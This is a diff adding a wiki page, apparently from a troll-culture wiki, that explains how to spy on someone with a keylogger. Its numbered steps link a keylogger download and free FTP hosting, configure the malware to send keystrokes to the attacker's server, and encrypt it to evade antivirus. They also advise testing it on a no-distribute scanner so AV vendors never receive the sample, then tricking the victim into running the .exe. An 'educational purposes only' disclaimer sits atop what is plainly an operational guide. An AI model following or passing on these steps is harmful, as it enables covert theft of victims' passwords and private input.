@@ -1,0 +1,21 @@
+Keylogging
+{{FactAlert|This is serious shit and has been known to cause drama and IRL [[Banhammer|Ban Hammers]]. Actually doing this might get you [[Partyvan|v&]]. The information on page is provided for educational purposes only.}}
+
+Keylogging involves tricking a person into running your .exe on their computer, which then records their keystrokes and sends them to you via FTP and the like.
+
+==Steps==
+#Download [http://sharebee.com/e12bc76e The Keylogger.] NO PASSWORD
+#Set up your own FTP server.  Free hosting can be found [http://anonym.to/http://www.free-webhosts.com/ here.]
+#Run peditor.exe; the password is "anonymous". Insert your server's information (ex. ftp://admin:dongs@ftp.example.com).
+#Encrypt it with something. Test at http://anonym.to/?http://scanner.novirusthanks.org and check "do not distribute sample"
+::* using other online av services and or not checking do not distribute will result in your virus being submitted to several av companies, making your virus detected very quickly
+#Make the victim open the .exe; all their keystrokes and programs they run will be sent to your FTP server.
+#????
+#PROFIT
+
+==See Also==
+*[[SubSeven]]
+
+{{Trolls}}
+
+[[Category:Softwarez]]
